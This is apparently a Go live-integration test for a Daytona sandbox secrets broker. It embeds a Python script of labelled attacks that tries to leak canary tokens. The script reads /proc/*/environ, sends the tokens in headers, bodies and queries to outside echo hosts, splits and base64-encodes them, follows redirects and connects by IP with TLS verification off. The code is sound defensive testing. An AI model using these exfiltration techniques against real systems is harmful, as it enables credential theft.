//go:build daytona_live

package daytona

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"strings"
	"testing"

	sdk "github.com/daytona/clients/sdk-go/pkg/daytona"
	"github.com/daytona/clients/sdk-go/pkg/types"
	"github.com/stretchr/testify/suite"

	"github.com/GetStream/Vision-Agents/acceleration/internal/connectors/core"
	"github.com/GetStream/Vision-Agents/acceleration/internal/sandbox"
)

// LiveSuite runs the attacks of the wave's table that need Daytona's real egress, against
// Daytona with DAYTONA_API_KEY: go test -tags daytona_live -run TestLiveSuite
// ./internal/sandbox/daytona. Every secret holds a random canary, never a real token.
//
// Daytona scrubs a secret's value out of every response back to its placeholder
// (https://www.daytona.io/docs/en/secrets.md, «Response scrubbing»), so an echo shows the
// placeholder whether or not it was substituted. The probe canary holds a ", which httpbin's
// JSON echo writes as \", a text the scrubber does not match: seeing it is the proof a
// placeholder was substituted. Without it, a «not substituted» check proves nothing and the
// test says so.
type LiveSuite struct {
	suite.Suite
	ctx    context.Context
	client *sdk.Client
	prefix string
	// probe is the canary the oracle reads; plain one a real token looks like.
	probe, plain string
}

func TestLiveSuite(t *testing.T) {
	if os.Getenv(apiKeyEnvVar) == "" {
		t.Skip("DAYTONA_API_KEY is not set")
	}
	suite.Run(t, new(LiveSuite))
}

func (s *LiveSuite) SetupTest() {
	s.ctx = context.Background()
	client, err := sdk.NewClient()
	s.Require().NoError(err)
	s.client = client
	s.prefix = "devlive_" + random()
	s.probe, s.plain = `canary"`+random(), "canary"+random()
}

func random() string {
	b := make([]byte, 6)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// box is a sandbox of session that may send PROBE_TOKEN and PLAIN_TOKEN to httpbin.org, and
// reach httpbingo.org as the host outside the grant.
func (s *LiveSuite) box(session string) *Sandbox {
	grant := func(binding, env string) sandbox.Grant {
		return sandbox.Grant{Connection: core.ConnectionRef{CustomerID: "live", ConnectionID: binding}, Binding: binding,
			Env: env, Hosts: []string{"httpbin.org"}}
	}
	broker, err := NewSecrets(SecretsOptions{Prefix: s.prefix, Session: session, Logger: slog.Default(),
		Tokens: func(_ context.Context, g sandbox.Grant) (sandbox.Token, error) {
			if g.Binding == "probe" {
				return sandbox.Token{Value: s.probe, Revision: 1}, nil
			}
			return sandbox.Token{Value: s.plain, Revision: 1}, nil
		}})
	s.Require().NoError(err)
	box, err := New(Options{Config: sandbox.Config{AllowedDomains: []string{"httpbingo.org"}, TimeoutMs: 240_000},
		Grants: []sandbox.Grant{grant("probe", "PROBE_TOKEN"), grant("plain", "PLAIN_TOKEN")}, Broker: broker})
	s.Require().NoError(err)
	s.T().Cleanup(func() { _ = box.Close() })
	return box
}

// attack is what code in the sandbox sees of each attack; other is a placeholder of another
// sandbox, for A8 and A9.
const attack = `
import base64, glob, json, os, socket, ssl, time, urllib.error, urllib.parse, urllib.request
P, Q, OTHER = os.environ["PROBE_TOKEN"], os.environ["PLAIN_TOKEN"], %q
def get(url, headers={}, data=None, context=None):
    for attempt in range(4):
        try:
            return urllib.request.urlopen(urllib.request.Request(url, headers=headers, data=data), timeout=30, context=context).read().decode()
        except urllib.error.HTTPError as e:
            failed = "ERROR %%s: %%s" %% (e.code, e.read().decode(errors="replace")[:300])
            if e.code not in (502, 503, 504) or "could not reach upstream host" in failed:
                return failed
            time.sleep(2 + 3 * attempt)
        except Exception as e:
            return "ERROR %%s: %%s" %% (type(e).__name__, e)
    return failed
environ = ""
for f in glob.glob("/proc/*/environ"):
    try:
        environ += open(f, "rb").read().decode("latin1")
    except Exception:
        pass
out = {"env": P + " " + Q, "environ": environ}
out["oracle"] = get("https://httpbin.org/headers", {"X-Probe": P, "X-Plain": Q})
out["a2"] = get("https://httpbingo.org/headers", {"X-Probe": P})
out["a3"] = get("https://httpbin.org/anything", {"Content-Type": "text/plain"}, ("t=" + P).encode())
out["a4"] = get("https://httpbin.org/anything?t=" + P)
out["a6"] = get("https://httpbin.org/redirect-to?url=" + urllib.parse.quote("https://httpbingo.org/headers"), {"X-Probe": P})
try:
    ip = socket.gethostbyname("httpbin.org")
    out["a11"] = get("https://" + ip + "/headers", {"Host": "httpbin.org", "X-Probe": P}, context=ssl._create_unverified_context())
except Exception as e:
    out["a11"] = "ERROR %%s: %%s" %% (type(e).__name__, e)
out["a12"] = get("https://httpbin.org/headers", {"X-Probe": P[:12] + " " + P[12:], "X-Encoded": base64.b64encode(P.encode()).decode(),
    "Authorization": "Basic " + base64.b64encode(("u:" + P).encode()).decode()})
out["c_httpbingo"] = get("https://httpbingo.org/headers")
out["c_query"] = get("https://httpbin.org/anything?t=hello")
out["c_fake"] = get("https://httpbin.org/headers", {"X-Probe": "dtn_secret_notarealone00"})
if OTHER:
    out["a8"] = get("https://httpbin.org/headers", {"X-Probe": OTHER})
print(json.dumps(out))
`

// seen is what one run of attack saw.
type seen map[string]string

func (s *LiveSuite) run(box *Sandbox, other string) seen {
	result, err := box.Run(s.ctx, fmt.Sprintf(attack, other), nil)
	s.Require().NoError(err)
	s.Require().Zero(result.ExitCode, result.Output)
	var out seen
	s.Require().NoError(json.Unmarshal([]byte(result.Output), &out), result.Output)
	return out
}

// substituted reports whether a response holds canary, as sent or as JSON escapes it.
func substituted(response, canary string) bool {
	return strings.Contains(response, canary) || strings.Contains(response, strings.ReplaceAll(canary, `"`, `\"`))
}

// blocked is Daytona's egress refusing a request: a 502 «could not reach upstream host», or
// a 403 to the CONNECT of the HTTPS_PROXY it sets in the sandbox.
func blocked(response string) bool {
	return strings.HasPrefix(response, "ERROR 502: could not reach upstream host") ||
		strings.Contains(response, "Tunnel connection failed: 403 Forbidden")
}

// unsubstituted checks that a request carrying sent went out without the probe canary: the
// host saw sent as it was, or Daytona did not send it. It returns which.
func (s *LiveSuite) unsubstituted(id, response, sent string) string {
	s.False(substituted(response, s.probe), "%s: %s", id, response)
	if blocked(response) {
		return "blocked"
	}
	s.Contains(response, sent, "%s: %s", id, response)
	return "unchanged"
}

func (s *LiveSuite) TestTheAttacksOnDaytonasEgress() {
	first := s.box("live-a")
	a := s.run(first, "")
	for id, response := range a {
		if id != "environ" {
			s.T().Logf("%s: %s", id, response)
		}
	}
	placeholders := strings.Fields(a["env"])
	s.Require().Len(placeholders, 2)
	probe, plain := placeholders[0], placeholders[1]
	results := map[string]string{}

	// A1: code reads placeholders, never a canary, wherever it looks.
	s.True(strings.HasPrefix(probe, "dtn_secret_"), probe)
	s.True(strings.HasPrefix(plain, "dtn_secret_"), plain)
	s.False(substituted(a["environ"], s.probe) || substituted(a["environ"], s.plain), "a canary in /proc/*/environ")

	// The oracle and the controls: without them a «not substituted» or «blocked» proves
	// nothing.
	s.Require().True(substituted(a["oracle"], s.probe), "the probe canary is no longer seen substituted: %s", a["oracle"])
	s.Require().Contains(a["c_httpbingo"], "headers", "httpbingo.org is reachable")
	s.Require().Contains(a["c_query"], "hello", "a query to httpbin.org goes out")
	results["control: an unknown dtn_secret_ in a header"] = s.unsubstituted("fake", a["c_fake"], "dtn_secret_notarealone00")

	// A5: an echo of a real-looking token comes back as its placeholder.
	s.Contains(a["oracle"], plain, "A5")
	s.False(substituted(a["oracle"], s.plain), "A5")

	for id, sent := range map[string]string{"A2": probe, "A3": probe, "A4": probe, "A6": probe, "A11": probe,
		"A12": probe[:12] + " " + probe[12:]} {
		results[id] = s.unsubstituted(id, a[strings.ToLower(id)], sent)
	}

	// A8: another sandbox's placeholder is not this sandbox's credential.
	second := s.box("live-b")
	b := s.run(second, probe)
	s.T().Logf("b a8: %s", b["a8"])
	s.Require().True(substituted(b["oracle"], s.probe), "the oracle reads the same in the second sandbox")
	results["A8"] = s.unsubstituted("A8", b["a8"], probe)

	// A9: once the session ends, Daytona keeps none of its secrets, and its placeholder is
	// nothing.
	s.Require().NoError(first.Close())
	name := "va_" + s.prefix + "_live-a"
	listed, err := s.client.Secret.List(s.ctx, &types.ListSecretsQuery{Name: &name})
	s.Require().NoError(err)
	s.Empty(listed.Items)
	after := s.run(second, probe)
	s.T().Logf("after a8: %s", after["a8"])
	results["A9"] = s.unsubstituted("A9", after["a8"], probe)

	s.Require().NoError(second.Close())
	everything := "va_" + s.prefix
	listed, err = s.client.Secret.List(s.ctx, &types.ListSecretsQuery{Name: &everything})
	s.Require().NoError(err)
	s.Empty(listed.Items)
	s.T().Logf("results: %v", results)
}
